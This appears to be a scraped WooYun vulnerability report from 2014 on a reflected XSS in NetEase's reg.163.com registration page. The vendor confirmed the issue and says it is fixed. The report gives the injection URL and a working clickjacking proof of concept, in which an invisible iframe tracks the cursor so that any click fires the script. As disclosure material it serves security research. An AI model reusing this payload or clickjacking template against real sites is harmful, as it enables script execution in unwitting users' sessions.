{"id": 49489, "wybug_id": "wooyun-2014-078470", "wybug_title": "网易某分站反射型XSS（点击劫持＋浏览器通用）", "wybug_corp": "网易", "wybug_author": "mramydnei", "wybug_date": "2014-10-06 18:02", "wybug_open_date": "2014-11-20 18:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向公众公开  简要描述： 一点小问题。 详细说明：  问题是在reg.163.com上面。具体url如下：\nreg.163.com/reg/confirm.jsp?login=');alert(document.domain)//\n相关的输出：\n<li>1.<a href=\"javascript:void(0);\" onclick=\"Core.sendMail('&#39;&#41;&#59;alert&#40;document.domain&#41;&#47;&#47;','urs','','http%3A%2F%2Freg.163.com%2F')\" id=\"sendMailBtn\">再次发送验证邮件</a></li>\n因为是输出在html attribute context，所以你给转换成html实体是解决不了XSS问题的。不过作为有效攻击，最大的缺点是需要用户去点击才能XSS。所以做了个点击劫持的demo。   漏洞证明：  POC: http://kcal.pw/163.htm\n<style>html, body {  cursor: pointer;}#box, #box > * {  position: absolute;  width: 10px;  height: 10px;  border: 1px solid red;  opacity: 0;}#victim {  border: none;}</style><div id=\"box\">  <iframe id=\"victim\" src=\"http://reg.163.com/reg/confirm.jsp?login=xss1\\&product=%29;alert%28document.domain%29//#sendMailBtn\" scrolling=\"no\"></iframe></div><script src=\"https://code.jquery.com/jquery-1.11.0.min.js\"></script><script>$(document).mousemove(function(e) {  var x = e.pageX;  var y = e.pageY;  $('#box').css({left: x - 5, top: y - 5});});</script>\n受害者点击页面任意处即可触发。不受浏览器限制。相关截图：\n\n   修复方案：  暂无   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-10-10 18:04 厂商回复： 感谢您对网易的关注，漏洞已经修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-10 19:31 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  衰木哥千秋万世一桶江湖    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}